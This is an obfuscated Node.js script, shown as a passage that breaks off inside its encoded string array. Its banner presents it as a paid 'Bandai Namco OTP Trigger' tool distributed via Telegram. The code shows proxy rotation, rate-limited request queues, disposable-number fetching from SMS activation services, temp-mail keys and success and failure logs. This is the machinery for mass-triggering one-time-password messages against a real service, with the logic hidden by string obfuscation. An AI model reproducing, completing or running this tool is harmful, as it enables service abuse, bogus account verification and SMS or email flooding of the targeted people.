const fs = require('fs'),
  path = require("path"),
  {
    execSync
  } = require("child_process"),
  {
    isMainThread,
    workerData,
    parentPort
  } = require("worker_threads");
if (isMainThread) {
  const req = ["https-proxy-agent", "socks-proxy-agent", "chalk", "cheerio"];
  let missing = false;
  for (const m of req) {
    try {
      require.resolve(m);
    } catch (v25) {
      missing = true;
      break;
    }
  }
  if (missing) {
    console.log("\n[SETUP] Installing dependencies...");
    try {
      const v26 = {};
      v26.stdio = "inherit", execSync("npm install https-proxy-agent socks-proxy-agent chalk@4 cheerio", v26);
    } catch (v27) {
      console.error("[ERROR] npm install failed"), process.exit(0x1);
    }
  }
}
const http = require("http"),
  https = require("https"),
  zlib = require("zlib"),
  crypto = require("crypto"),
  chalk = require("chalk"),
  rl_mod = require("readline"),
  cheerio = require("cheerio"),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent"),
  {
    SocksProxyAgent
  } = require("socks-proxy-agent");
let OUT_DIR = __dirname,
  S_FILE = path.join(OUT_DIR, "successful.txt"),
  F_FILE = path.join(OUT_DIR, "failed.txt");
const DBG = path.join(__dirname, "debug.txt"),
  MCX_KEY = path.join(__dirname, "mailcx_key.txt");
(function () {
  const fn3 = function () {
    let v29;
    try {
      v29 = Function('return (function() {}.constructor("return this")( ));')();
    } catch (v30) {
      v29 = window;
    }
    return v29;
  };
  const v28 = fn3();
  v28.setInterval(fn2, 0xdac);
})();
function dbg(v31, v32, v33) {}
let SUCCESSFUL_FILE = path.join(__dirname, "successful.txt"),
  FAILED_FILE = path.join(__dirname, "failed.txt");
const B = chalk.hex("#00C9A7"),
  C = chalk.hex("#FFD700"),
  Y = chalk.hex("#FF6B35"),
  W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF4466"),
  DIM = chalk.hex("#555555");
function printHeader() {
  process.stdout.write("[2J[3J[H"), console.log(B("    ____                  __          _   __                          ")), console.log(B("   / __ )____ _____  ____/ /___ _____(_) / | / /___ _____ ___  _________  ")), console.log(C("  / __  / __ `/ __ \\/ __  / __ `/ __/ / /  |/ / __ `/ __ `__ \\/ ___/ __ \\ ")), console.log(C(" / /_/ / /_/ / / / / /_/ / /_/ / / / / / /|  / /_/ / / / / / / /__/ /_/ / ")), console.log(Y("/_____/\\__,_/_/ /_/\\__,_/\\__,_/_/ /_/_/_/ |_/\\__,_/_/ /_/ /_/\\___/\\____/  \n")), console.log(W("┌──────────────────────────────────────────────┐"));
  console.log(W("│ [•] Author    : ") + B("NOT REXY                     ") + W('│')), console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│')), console.log(W("│ [•] Status    : ") + G("Premium License              ") + W('│')), console.log(W("│ [•] Target    : ") + Y("Bandai Namco — OTP Trigger   ") + W('│')), console.log(W("│ [•] Version   : ") + B("BANDAI-V1.0.0                ") + W('│'));
  console.log(W("└──────────────────────────────────────────────┘\n"));
}
class NexaRateLimiter {
  constructor(v34) {
    this.delayMs = v34, this.queue = [];
    this.processing = false;
  }
  ["enqueue"](v35) {
    return new Promise((v36, v37) => {
      this.queue.push(async () => {
        try {
          v36(await v35());
        } catch (v38) {
          v37(v38);
        }
      });
      if (!this.processing) this._process();
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0x0) {
      const v39 = this.queue.shift();
      await v39(), await new Promise(v40 => setTimeout(v40, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(0x1f4),
  VOLTX_KEY_FILE = path.join(__dirname, "voltx_key.txt"),
  STEX_KEY_FILE = path.join(__dirname, "stex_key.txt"),
  SMSBOWER_KEY_FILE = path.join(__dirname, "smsbower_key.txt");
function smsBowerRequest(v41) {
  return new Promise((v42, v43) => {
    const v44 = {};
    v44.Accept = "text/plain", v44.Connection = "close";
    const v45 = {};
    v45.hostname = "smsbower.page", v45.port = 0x1bb, v45.path = "/stubs/handler_api.php?" + v41;
    v45.method = "GET", v45.headers = v44;
    const v46 = v45;
    const v47 = https.request(v46, v48 => {
      let v49 = '';
      v48.on("data", v50 => v49 += v50);
      v48.on("end", () => v42(v49.trim()));
    });
    v47.on("error", v51 => v43(new Error("SmsBower net: " + v51.message))), v47.setTimeout(0x3a98, () => {
      v47.destroy();
      v43(new Error("SmsBower timeout"));
    });
    v47.end();
  });
}
function smsBowerFetchNumber(v52, v53, v54, v55) {
  let v56 = "api_key=" + encodeURIComponent(v52) + "&action=getNumber&service=" + encodeURIComponent(v53 || 'fb');
  return v54 && String(v54).trim() !== '0' && String(v54).trim() !== '' && (v56 += "&country=" + encodeURIComponent(v54)), v55 && parseFloat(v55) > 0x0 && (v56 += "&maxPrice=" + encodeURIComponent(v55)), smsBowerRequest(v56).then(v57 => {
    if (v57.startsWith("ACCESS_NUMBER:")) {
      const v58 = v57.split(':');
      return {
        'activationId': v58[0x1],
        'phoneNumber': v58[0x2].replace(/[^0-9]/g, '')
      };
    }
    throw new Error("SmsBower: " + v57);
  });
}
const ZENEX_KEY_FILE = path.join(__dirname, "zenex_key.txt");
function zenexFetchNumber(v59, v60) {
  return new Promise((v61, v62) => {
    const v63 = {};
    v63.range = v60;
    v63.is_national = false, v63.remove_plus = false;
    const v64 = JSON.stringify(v63);
    const v65 = {
      'hostname': "api.zenexnetwork.com",
      'port': 0x1bb,
      'path': "/v1/getnum",
      'method': "POST",
      'headers': {
        'mapikey': v59,
        'Content-Type': "application/json",
        'Content-Length': Buffer.byteLength(v64)
      }
    };
    const v66 = https.request(v65, v67 => {
      let v68 = '';
      v67.on("data", v69 => v68 += v69), v67.on("end", () => {
        try {
          const v70 = JSON.parse(v68);
          if (v70?.["meta"]?.["code"] === 0xc8 && v70?.["data"]?.["full_number"]) v61(v70.data.full_number.replace(/[^0-9]/g, ''));else v62(new Error(v70?.["message"] || "Zenex: no number"));
        } catch (v71) {
          v62(new Error("Zenex: invalid JSON"));
        }
      });
    });
    v66.on("error", v72 => v62(new Error("Zenex net: " + v72.message))), v66.setTimeout(0x3a98, () => {
      v66.destroy();
      v62(new Error("Zenex timeout"));
    }), v66.write(v64), v66.end();
  });
}
const twoOoLimiter = new NexaRateLimiter(0x1f4);
function stripRid(v73) {
  return v73.replace(/X+$/i, '').trim();
}
function fn1() {
  const v74 = ['v1nmzNy', 'BM93', 'y3zjqxK', 'Bwv0yq', 'iK5VDcHbo0jYyw5KiJT2psi5osi', 'l3yXl2vTywLSlW', '4PQHief1Dg8Gzgv0zwn0icyGC2vUzcaOiZeGCMfUz2uP', 'lxnZAwqT', 'l2rVBwfPBNm/CgfNzt0X', 'u0vmrunuifriuKvbrfm', 'zw1HAwW', 'rMLSDgvYigj5igfWCdO', 'ihWGu2vZC2LVBIbLCNjVCGO', 'CgfKrw5K', 'Ec1Yzxf1zxn0zwqTD2L0Aa', 'we1mshr0CfjLCxvLC3q', '8j+uGsbzzxmSihjLDhj5ihvWihrVidmGDgLTzxm', 'Dw5SAw5Ru3LUyW', 'kcGOlISPkYKRksSK', 'D1PmzKW', 'zvH3q3m', '8j+tMezcka', 'nJzszKDQu1G', '4PQHief1Dg8GzMv0y2GGzNjVBsbwB2X0EcaOmM9VosK', 'CwLVr08', 'ugHivLC', 'mteYvNfsDffT', 'AxnqCML2yxrL', 'g1SWBq', 'q0jzuNC', 's05Iyum', 't2vrEvu', 'qvzit0C', 'vML1sgW', 'wvritgW', 'g1SWBqO', 'C29JA3mTChjVEhKTywDLBNq', 'wLDTt1i', 'y291BNrYEu5V', 'qwLAs0m', 'B3rWlwzVDw5K', 'C21ZyM93zxi', 'C2LK', 'twf4ie9uuc9nywLS', 'icb8icbty2fUBMvKoIa', 'yxv0BW', 'yxbPs2v5', 'zufUy1C', 'zgLYBMfTzq', 'C21ZqM93zxjdB25MAwC', 'zLjlA04', 'C3rHCNrZv2L0Aa', 'rw50zxiGugHVBMuGtNvTyMvYicHLlMCUicSZotm2oda4mta1mtqGB3iGsvq6mZy4mdGXmduXncK6', 'EMvUzxHFA2v5lNr4Da', 'vfHWq2u', 'igHPDhmPica', 'v3fHBLC', '8j+uGsbzzxmSihjLDhj5ihvWihrVidiGDgLTzxm', 'CvvUuwS', 'ALfWu0C', 'rhnKuvy', 'Bwv0Ag9K', 'l2fWAs92ms9UDw1IzxjZl2DLDa', 'zxrrCxC', 'EwvZ', 'z3jLzw5cCMLNAhq', 'BezdELu', 'uKXSq1C', 'icbgqvrbtdOG', 'B0Xfz1y', 'yxbPx2TLEt0', 'ywDLBNq', 'tuvYBNq', 'AwHqs2m', '8j+AQYboB25LicHeAxjLy3qGq29UBMvJDgLVBIK', 'C3rKAw4', 'ywXS', 'i0zgndq2nG', 'icaVif9FicaVif9FigaVif9FifWVif9FicaVif9FigaVif9FlYaVic8GihWVic8Gx18Gyc8Gx18Gyf9FifWVif9FxY8Gx18Gxca', 'u2nYyxbLCIblAw5N', 'vwX1C2C', 'yxbWBgLJyxrPB24VANnVBG', 'q29UC29SzsbUzxr3B3jRoIa', 'sMfTzxm', 'ChjVDMLKzxi', 'icdINjmGtgLJzw5ZztOGtgLJzw5Zzwq', 'u21ZqM93zxiGBMv0oIa', 'C3rYAw5N', 'qMXpu1O', 'oIbtzw5KAw5NifnnuYbpvfaGkfnLC3nPB24Gt1rqicm', 'iZG4odG4oa', 'se9xie1btLKGt1rquYbqrviGru1bsuW/', 'uMvTB3zLihnHDMvKigTLEq', 'quHgwva', 'CMfUz2vZ', 'y0nkDhq', 'BwfPBc5JEcb0Aw1LB3v0', 'Agv4', 'DfbwA08', 'CgfYC2u', 'zw5K', 'sg93ig1HBNKGBNvTyMvYCZ8Gw2rLzMf1Bhq6iduWxtO', 'ihbLCIb2zxjPzMLLzcbLBwfPBa', 'y291BNrYEu5HBwu', 'wKHNEfe', 'ugHVBMuGy2HLy2S6ieHuvfaG', 'u1PrCgu', 'veDoqMK', 'p3nPBMnLpq', 'z3jLyxnL', 'CMvZDw1L', 'rw50zxiGBMv3igTLEq', 'zM9YrwfJAa', 'EMvUzxG', 'wuTRyw0', 'zxHPC3rZ', 'C21ZyM93zxiUCgfNzq', 'vgf5Bg9Y', 'EgnLqLe', 'l2fWAs9ZAwDUvxaVBwvTyMvY', 'Aw5MBgf0zvn5BMm', 'AwLHq0O', 'z0XVsg8', 'u2vYDMLJzsbJB2rLicHLlMCUigzIlcbPzYWGD2ePifTKzwzHDwX0oIbMyL06', 'Bwf4t3rWC1bLCLnLC3nPB24', 'A09LDeS', 'u3bsuLy', 'uunMBfm', 'y3LHBG', 'Bwn4s2v5', 'C2vJlwnOlxvH', 'BMf2AwDHDgu', 'C3rKB3v0', 'wgPkvwW', 'Dg9gAxHLza', 'iokUNIa', 'icbcqu5equKGtKfnq08Gt1rqifrssuDhrviG4OcuienptvbmrvrficaGicaGicaG', 'q2D0sgK', 'C2v0lwnVB2TPzq', 'BhLJDKe', 'shfUCMu', 'ChjVEgLLC0zPBgu', 'DxbKyxrL', 'ifnHzMfYAs81mZCUmZy', 'l3n0B3jHz2uVzw11Bgf0zwqVma', 'Aw5ZDgfNCMfT', 'igHPDhmk', 'ndi0oti2mgjlyNP1DG', '4PYtifbYB3HPzxmGBg9HzgvKoIa', 'qKnkyNe', 'vhHxr1G', 'yxbPlNPLBMv4BMv0D29YAY5JB20', 'oty1', '4PYtieXVywrLzca', 'AeT4CM0', 'vwLtv00', 'ngXQqu9usW', 'v2Hev28', 'l3n0DwjZl2HHBMrSzxjFyxbPlNbOCd8', 'C2PowvG', 't25LrhjPDMu', 'l2fWAs9ZAwDUvxaVzw1HAwWVDMfSAwrHDgu', 'yMfUzgfP', 'zw1WDhK', '8j+AQYboBYWGC2TPCcbPBw1LzgLHDgvSEsbVBIbMywLSDxjL', 'l01yuZq3rKXgwdbvl3rUzxzZl0bWDwjSAwmVyxbPl2DLDg51Bq', 'DgLTzw91Da', 'AvzeAxq', 'rgLZywjSzwq', 'icaGg1SZnM3INPqBwZm1Bsa', 'y29Uy2f0', 'zxjbv2K', 'y2TdCxq', '4QYf77IpieDViejHy2SGDg8Gq291BNqGsw5WDxq', '8j+tUcbjBNn0ywDYyw0', 'cIaG4PYxie5VigHPDhmGAw4Gy29UC29SzsbMzwvKlGO', 'C3vJy2vZCW', 'z3Hvs1K', 'zgvSyxLnCW', 'C2vZC2LVBG', 'Cg9SBc1ZDgf0Dxm', 'msbpvfaGCgvYievTywLSicHgCMvZAcbLBwfPBcbMB3iGzwfJAcbUDw1IzxiP', 'tLr2yM0', 'uhrgyKe', 'Bwf1DgHHCgK', 'C2LUz2XL', 'u3vJy2vZC2z1Ba', 'z3PPCcWGzgvMBgf0zsWGyNiSihPZDgq', 'rhnjq3K', 'g1SYsW0k', 'vunUse0', 'ywrKtg9N', 'ywjJzgvMz2HPAMTSBw5VChfYC3r1DND4ExOWmtiZndu2nZG5', 'ALf3u2O', 'B1P3DKu', 'qNjVD24', 'C1PcELK', 'tw96AwXSys81lJaGkfDPBMrVD3mGtLqGmtaUmdSGv2LUnJq7ihG2ncKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlW', 'x3bYB2nLC3m', 'BwfPBgn4', 'zg9TywLU', 'oty4', 'l21LC3nHz2vZlW', 'lxnLC3nPB24T', 'u2vJluzLDgnOlvnPDgu', 'BwfPBc5JEdOGCMf0zsbSAw1PDgvKicG0mJKP', 'Dg90ywXoDw1IzxjZ', 'iZmZmZmZmW', 'sMrVrNy', 'rgf2Awq', 'Bg9HzenVDw50CNLuywjSzs1LCNi', 'y2XVC2u', 'DMfS', 'EgDdqMy', 'CNPADNe', 'zw1HAwWTChjLDMLLDW', 'E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK', 'uwfKsw0', 'BNvTyMvYCY50Ehq', 'vuPgqKG', 'whjYCgO', 'q291BNrYEsbUB3qGC3vWCg9YDgvKigj5iejHBMrHAsaO', '4QYf77IpieDViejHy2SGDg8GtNvTyMvYCYbtzwXLy3rPB24', 'zw5KC1DPDgG', 'yM9VDhn0CMfW', 'igf0DgvTChrZihbLCIbYzwPLy3rLzcbUDw1Izxi', 'DM9SDhG', 'y291BNrLCG', 'y2HPBgrFChjVy2vZCW', 'B1nir08', 'zMfPBgvKlNr4Da', 'w09uucaJ', 'zMLSDgvY', 'Aw5KzxHpzG', 'l2fWAs9WAg9Uzu5Vl2f1DgG', 'sMfJA3nVBG', 'wZiVnf0GqM9VDhn0CMfWCgLUzYbZzxnZAw9UlI4U', 'mJaGvgHYzwfKCYaOrgvMyxvSDcK', 'z2v0ugf0Aa', 'zMLrtNu', 'zMfQD2W', 'C3rHDhvZq29Kzq', 'rwvHEgW', 'y29VA2LL', 'vKzRAvC', 'oIbdAgvJA2LUzYbWAg9Uzsa', 'CgHVBMuTB3rWlwvYCM9Y', 'C3ndC3G', 'rgzswMS', 'DLbTDeW', 'AhrTBa', 'DgfPvxa', 'BuvZBuK', 'wfbPC3i', 'iokCLYbty3jHCgvYieTPBMC', 'z3vUEMLWu3LUyW', 'u0vtu0LptIbJB29RAwuGBwLZC2LUzW', 'zg9TywLUCW', 'iK5VDcLbo0jYyw5KiJT2psiYnci', 'icaGicaGia', '8j+tGsbmB2fKigzYB20GzMLSzsaOBNvTyMvYCY50EhqP', 'nsbpvfbZihbLCIbfBwfPBa', 'C2vYDMvYrw5KCg9PBNq', 'rw50zxiGy3vZDg9Tig51BwjLCIbVzIb0AhjLywrZicH0ExbLicDIywnRjYb0BYbNBYbIywnRktO', 'Ec1HCgKTDg9Rzw4', 'vLDku2G', 'Bg9JyxrPB24', 'BwfPBc50BtOGBM8GDg9Rzw4', 's0Xcywi', 'zMfPBgvK', '8j+mKcbbDxrVigzLDgnOigzYB20GtMv4yu9uucbqyw5LBa', 'svnyCwS', 'ywrKCMvZCW', 'xsdINjCGqwjVCNrPBMCG4OcuiduGy29UC2vJDxrPDMuGzMfPBhvYzxmUieXHC3qGzxjYB3i6ia', 'A3PTAxK', 'iK5VDf9biejYyw5KiJT2psi4iG', 'y29Kzq', 'sNLluM0', 'tM8Gyxv0AfnUigLUihjLC3bVBNnL', 'vgvTCea', 'vxbNCMfKzs1jBNnLy3vYzs1szxf1zxn0CW', 'zNvUy3rPB24GkLWOicPCkq', 'AKXkr3K', 'B25tDgf0Dxm', 'D1rVzMq', 'wMvUzxGGBMv0oIa', 'Cg9YDa', 'DNLIrhK', 'vMvYu3y', 'Ewr2Axa', 'zw1HAwWTB3rW', 'AvnsANq', 'yxv0AfnU', 'AfrsvuS', 'AhLKCMe6BwvTyMvY', 'oIbqAg9UzsbHBhjLywr5ihjLz2LZDgvYzwq', 'u3rLEcdWN5sL', 'wZmVnf0Grw1HAwWGt1rqic0+ia', 'yxbWzw5KrMLSzvn5BMm', 'mM9VosbUzxr3B3jRoIa', 'ndm5ote3t2jxCxno', 'qxnOBgv5', 'icdILze', 'yNL0zuXLBMD0Aa', 'Bg9HzejHBMrHAvn1ChbVCNrLzenVDw50CMLLCY1LCNi', 'yMfJAW', 'mM9VotOGvgLTzw91Da', 'C2vHCMnO', '4QYf77IpieDViejHy2SGDg8GtNvTyMvYifnVDxjJzq', 'CMvTB3zL', 'zg93BG', 'Ag9ZDa', 'Bwv0yvTUyw1LpsjFy3nYzIjD', 'BgfSuLC', 'B05izMe', 'u21ZqM93zxi6ia', 'ELffruO', 'qM93Au8', 'oI8V', 'ic8Gl18Vic8Gl18Vic8GlYaVic8Gl18Vic8Gl18Vic8GlYaVic8GlYaVFcaGlYaVxY8GlYaVic8GlYaVic8Gl19FlYaVxY8GlYa', 'D0ThDe0', 'Cg9W', 'CMvTB3zLtgLZDgvUzxi', 'wZqVnf0Gv2fPDgLUzYbLBwfPBcbpvfaUlI4', 'rurAu3y', 'ywDYzwvbz2vuzxjTCW', 'CMvHzezPBgvtEw5J', 'A2zsCKm', 'CvDOsuS', '4PscifVIGkjDief1DgHVCIaGica6ia', 'DuHZwfe', '8j+mKe1LDgeO', 'zxLzzwO', 'iJeWlJe1lJCI', 'teLHywO', '8j+uJsbbDxrVifjHBMDLiezPBMrLCIaOC2nHBIbJB25ZB2XLkq', 'vw5RBM93BG', 'BgfZDfjLCq', 'q29UDgvUDc1mzw5NDgG', 'D2HPBguGkhrYDwuPihT9', 'BMv4Df9ZAw5Jzq', '8j+tSsbfBNrLCIbZAw5NBguGCgHVBMuGBNvTyMvY', 'C3bSAxq', 'Dg90ywXdB3vUDa', '8j+mKcbnzxrH', 'BMvcy0m', 'iK5VDd9bx0jYyw5KiJT2psiYnci', 'zMXVB3i', 'C3rHCNruAw1L', 'tKfgAvq', 'CMfUzg9TqNL0zxm', 'oIbtzxnZAw9UigvYCM9Y', 'zg9JDw1LBNq', 'B3rWlwzYB20TChjLDMLLDW', '4QYf77IpiejHy2S', 'iJeWlJaUmci', 'C2fTzs1VCMLNAw4', 'drTBsW', 'CMvTB3zLx3bSDxm', 'sgfYCMLZ', 'C3rVCa', 'yxv0AfjLC3vSDenVzgu', 'z2PKvhe', 'v0LuEMG', 'BMv4yw90ChnLCNzPy2uUy29T', 'DgHYzwfKCW', 'r0vu', 'cIaG4PYtief1Dg8GuMfUz2u6ia', 'l3yXl2LUyM94lW', 'ihWG', 'sg93ig1HBNKGBNvTyMvYCZ8Gw2rLzMf1Bhq6ntbDoG', 'qwLWBu8', 'DxnLCG', '4PYtifrOCMvHzhmGoIa', 'icHLlMCUidq0nZm4ndvywfGPig9YicDIywnRjZO', 'CMvUzgvY', 'C2vJlwnOlxvHlw1VyMLSzq', 't25LrhjPDMuGlsbqzxjZB25HBa', 'wwvZlcbHzgqGyw5VDgHLCIbYyw5Nzq', 'zKL4rM8', 'weHYAuK', 'C2vJlwnOlxvHlxbSyxrMB3jTlxzLCNnPB24', 'C2TOrxu', 'y0HfBLK', 'ELnMt08', 'CMvNAxn0zxi', 'ChjVy2vZC2LUzW', 'l2fWAs92ms9UDw1IzxjZl3aYl2DLDa', 'yxbWBgLJyxrPB24VANnVBIWGDgv4Dc9WBgfPBIWGkI8Q', 've1rAKS', 'sw1vq04', 'AxrsuLe', 'CMfgyNi', 'vhzAEuy', 'C3rHDhvZ', 'r1PAtuC', 'sM9OBNnVBG', 'u3Posfq', 'ks4GvxnLigL0pW', '4PYtie9uuc9nywLSoIa', 'uLbky1i', 'CMv0DxjUicHMDw5JDgLVBIGPia', 'l3rVA2vU', 'txvhBwG', 'DhDhweK', 'AgvHzgvYCW', 'u0vmrunuie5vtujfuIbtt1vsq0u', 'wwvZ', 'yw5KCM9Pza', 'sgreAuK', 'wNjKA3G', 'tMziBvi', 'EMXPyG', 'sfLZuNO', 'rMf0ywWGzxjYB3i6ia', 'w0vsuK9sxsbUCg0GAw5ZDgfSBcbMywLSzwq', 'CMvHzgXPBMu', 'Ag9TzwrPCG', 'qMvHCMvYia', 'BwfPBc5JEdOG', 'CMLK', 'DMPiAfm', 'sM9Uzxm', 'tM8SigvUDgvYig5LDYbRzxK', 'CMfUz2u', 'EKLiBfC', 'AMfY', 'y1rms2y', 'C3vJy2vZC2z1Ba', 'y291BNrYEq', 'ue9tva', 'C29JA3m1oI8V', 'tM8GBNvTyMvYCYbHDMfPBgfIBgu', 'ntaGvgHYzwfKCYaOrMfZDcK', 'v0zfBKK', 'zNvSBf9UDw1Izxi', 'iK5VDf9biejYyw5KiJT2psiYnci', '4PYtifjLDhjPzxmGoIa', 'v2Xosem', '8j+tPIbbBgW', 'zgvIDwCUDhH0', 'u3HNwM0', 'twfYDgLU', 'z1z6EKu', 'uhjPB3jPDhK', 'yMvtDgS', 'rw50zxiGwMvUzxGGqvbjieTLEsaOBwfWAwTLEsK6', 'vM9nvfe', 'icbdB3vUDhj5ihj1BgvZoIa', 'mZK1odi2zxfUAvjJ', 'r1HJEw8', '4PscifVIGkjDifzLCNnPB24Gica6ia', 'Cg9SBc1LCNjVCG', 'EMvUzxHdB25MAwC', 'C29JA3m0oI8V', 'yxbP', 'tLPAy2K', 'C2vZC2LVBK90CenVDw50', 'BLPcuMC', 'iK5VDdTbpujYyw5KiJT2psi4iG', 'C2v0sw50zxj2ywW', 'CMvJDxjZAxzL', 'C3rYAw5NAwz5', 'BwfPBc50BtOGBM8Gzg9TywLUCW', 'uM9Izxj0', 'zMLUza', 'zw1PDeTLExbYzxnZrxzLBNrZ', 'q29UC29Szsb0Aw1LB3v0', 'vvHdsfm', 'sMnNEKC', 'rgf2Axm', 'C29Tzq', 'icaO', 'qMfUzgfPie5HBwnViokaLcbpvfaGvhjPz2DLCIaGia', 'DxnbBxy', '4QYf77IpieDViejHy2SGDg8Gt1rqCYbqzxiGrw1HAwW', 'otCZ', 'zgvMBgf0zq', 'z3b0suG', 'vNPsB3m', 'zwLurfO', 'v2LSC29U', 'q2vwzMu', 'CgHVBMu', 'rhLnuvy', 'DhHbuKO', 'zxHPDa', 'DMDwC08', 'wfnPDMu', 'ChvZAa', 'Dgv4Dc9ODg1SlgfWCgXPy2f0Aw9Ul3HODg1Sk3HTBcXHChbSAwnHDgLVBI94BwW7Ct0WlJKSAw1Hz2uVyxzPzIXPBwfNzs93zwjWlcOVkJTXptaUoa', 'Bwf4uMv0CMLLCW', 'DhbKu2C', 'icaG', 'BM9FCgX1C19UDw1Izxi', 'Bg9IzLy', 'ks4UlG', 'uMfUz2uGrMLUzgvYig1Vzgu6', 'CMvMzxjLCG', 'sw52ywXPzcbWCM94Eq', '4QYf77IpieDViejHy2SGDg8GuhjVEgLLCYbtzwXLy3rPB24', 'Cg9SBc1ZDgf0DxmTndi5', 'AxPAsLe', 'lJaU', 'CMvXDwvZDa', 'y3nYzG', 'C3rHDgvpyMPLy3q', 'u2vSzwn0ihjHBMDLCZO', 'rvzlzu8', 'Dg9vChbLCKnHC2u', 'BgvUz3rO', 'BwfPBhrT', 'vxnLihnHDMvKigTLEq', 'AgjWB3e', 'uNDnC04', 'zhnqy3e', 'u2nYyxbLCIblAw5NicaGicaGicaGicaGicaGica', 'EKXQte8', 'EwDYsfm', 'iK5VDc9bkujYyw5KiJT2psi4iG', 'l3jLz2LZDgvYl21HAwXHzgrYzxnZl2f1DgG', 'v2HPDgu', 'Aw5PDa', 'qw5KzxjZB24', '4PscifVIGkjDifn0yxr1CYaGica6ia', 'u2vUzgLUzYbttvmGt1rqicG', 'uNrxv0q', 'Ec1JC3jMlxrVA2vU', 'CMv0CNK', 'cIaGw/cFK7eGu01tiejVD2vYxsbtDhjLyw1PBMCG', 'ihjHBMDLkhmPks4UlG', 'rw50zxiGBwf4ihjLDhj5igf0DgvTChrZicGWigzVCIbUB25LlcbVCIaNyMfJAYCPoG', 'C29JA3m1', 'u2fYywG', 'u3rPwwW', 'qwrKzwqG', 'iJe1lJaUmci', 'sKXNzNi', 'teDKs3q', 'yMfZzty0', 'cLTtrvrvuf0Gsw5ZDgfSBgLUzYbKzxbLBMrLBMnPzxmUlI4', 'ihrHCMDLDhm', 'tw96AwXSys81lJaGke1Hy2LUDg9ZAdSGsw50zwWGtwfJie9tifGGmtbFmtvFnYKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlW', 'lI4U', 'yNjVDgXPrgvJB21WCMvZC1n5BMm', 'C2vJlwnOlxvHlxbSyxrMB3jT', 'l01yuZq3rKXgwdbvl3rUzxnZl0bWDwjSAwmVyxbPl2nVBNnVBgu', 'BuD0u2y', 'rw1HAwWGDMfSAwrHDgu6ieHuvfaG', '4QYf77IpieDViejHy2SGDg8GvgHYzwfKCYbtzwXLy3rPB24', 'Bwf4uhjPy2u', 'vfDlC20', 'AwLjBMS', 'cIaG4PYxie5VigHPDhmGzM9YihnLBgvJDgvKigfWCc4k', 'CMvZB2X2zq', 'm3WWFdf8nhWYFdu', 'ugHVBMuGywXYzwfKEsbYzwDPC3rLCMvKoIa', 'sfDxDK0', 'DMvZA3q', 'sg93ig1HBNKGBNvTyMvYCYb0BYbWCM9JzxnZpYaODhLWzsaNyMfJAYCGDg8Gz28GyMfJAYKGw2rLzMf1Bhq6iduWxtO', 'u2vYDMvYideGkc9NzxqP', 'A2v5ChjLC3m', 'l2fWAs9ZAwDUvxaVzw1HAwWVyxv0Aa', 'icdILia', 'AxnuvfK', 'C2HPzNq', 'u01tifnftLqG4OAsia', 'iefqssaO', 'zgnOu1y', 'iefqssblzxKGkg1HDxrOyxbPktO', 'tMv4yu9uucbUzxr3B3jRoIa', 'zhrnsKS', 'zMLSzq', 'reD4vu4', '4PYxievYCM9YoIboDw1IzxjZigzPBguGBM90igzVDw5KoIa', 'ifTpvfaGiW', 'jM1HEfbYAwnLpq', 'v0jUwNy', 'yxr0CG', 'DhLWzq', 'D2rfDhq', 'q3bOEKK', 'rw50zxiGvgfYz2v0ie51BwjLCNmGrMLSzsbqyxrOicHVCIaNyMfJAYCPoG', 'icdILztILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzC', 'odGW', 'otCX', 'l2fJy291BNrZ', 'vw5SAw1PDgvKicH1BNrPBcbSAw1PDcK', 'BwfPBgn4x2TLEs50Ehq', 'uKT2EK4', 'mtaGvgHYzwfKCW', 'g1SWBsa', 'DhjPBq', 'v2LSBgLHBq', 'q2Psr3q', 'u2vYDMvYidmGkc9WmY9NzxqP', 'CgfZC3DVCMq', 'z2v0rNvSBfLLyxi', 'vvv2DKW', 'uuP4tMC', 'iK5VDcbbkejYyw5KiJT2psi4iG', 'Awvnuhy', 'lY8Gpt09pt09pt09pt09pt09pt0GuMvXDwvZDca5id09pt09pt09pt09pt09pt09', 't0vIBxi', 'ywrK', 'C3vIAMvJDa', 'AxnV', 'C2L6zq', 'uKfZwKq', 'g1SYsHTBsa', 'C2v0u3rHDhvZ', 'u1fpBMe', 'wMHdB2m', 'CLHXshC', 'iM1Hy09tiG', '8j+tSsbttvmGqM93zxi', 'C3bSAwnL', 'twLSBgvY', 'icaGif9Fx18GicaGicaGicaGicaGicaGicbFxYaGicaGicaGicbFicaGx18GicaGicaGicaGicaGicaGicaGicaGicaGia', 'q291BNrYEsbJB2rLicGWid0Gyw55ksbBzgvMyxvSDdOGmf06', 'i0zgrdCWma', 'DMfSAwrHDgu', 'cIaG4PYxienVBNnVBguGzMv0y2GGzMfPBgvKoIa', 'igTLEsbMB3vUzcaO', 'r1jfzvq', 'q29UC29SztOGsw52ywXPzcbku09o', 'qwDlqvi', 'u2vYDMvYidiGkc9WmI9NzxqP', 'zxjYB3i', 'l21LC3nHz2vZp3bHz2u9mq', 'CgnZz3y', 'yNvPBgrnyxG', 'iK5VDd1bx0jYyw5KiJT2psi4iG', 'BNvTyMvY', 'y29UDgvUDc1LBMnVzgLUzW', 'ig51BwjLCNmUlI4', 'qKL4wxa', 'zfPAveK', 'C2vZC2LVBI12zxjPzMLLzc1YzwfKEq', 'rM91BMqGC2f2zwqGqvbjieTLEsaOlI4U', 'C2vSzwn0', 'BwvZC2fNzq', 'BwfUDwfS', 'u21NDNC', 'v3PQs1C', 'C29YDa', 'C2v0uMf3tw9Kzq', 'vLnqzgm', 'y2HHBgS', 'icboBYbWCM94AwvZignVBMzPz3vYzwqGkhj1BM5PBMCGzgLYzwn0kq', 'vMLH', 'l01yuZq3rKXgwdbvl3rUzxnZl0bWDwjSAwmVyxbPl2DLDg51Bq', 'zw4TvvmSzw47Ct0WlJK', 'CvDJDNm', 'Bg9Hza', 'CLPKtwm', 'u21ZqM93zxiGDgLTzw91Da', 've9dCNC', 'BwfPBc50BtOG', 'D29YA2vYx3rOCMvHzhm', 'CMvK', 